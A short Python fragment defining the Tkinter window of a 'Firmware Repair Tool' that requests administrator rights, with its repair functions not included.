def create_gui():
    """Creates Tkinter GUI."""
    window = tk.Tk()
    window.title("Firmware Repair Tool")
    window.geometry("600x400")
    window.resizable(False, False)
    
    start_button = tk.Button(window, text="Start", font=("Arial", 14, "bold"), bg="green", fg="white", command=lambda: start_repair(window, log_area, status_label))
    start_button.pack(pady=10)
    
    status_label = tk.Label(window, text="Status: Ready", font=("Arial", 12))
    status_label.pack(pady=5)
    
    log_area = scrolledtext.ScrolledText(window, height=15, width=70, font=("Arial", 10))
    log_area.pack(pady=10)
    
    run_as_admin()
    if not is_admin():
        log_message(window, log_area, "Failed to start: Must be run with administrator privileges!", success=False, operation="Start")
        window.after(2000, window.destroy)
        return
    
    window.mainloop()

if __name__ == '__main__':
    create_gui()
    del commands
    sys.modules.clear()
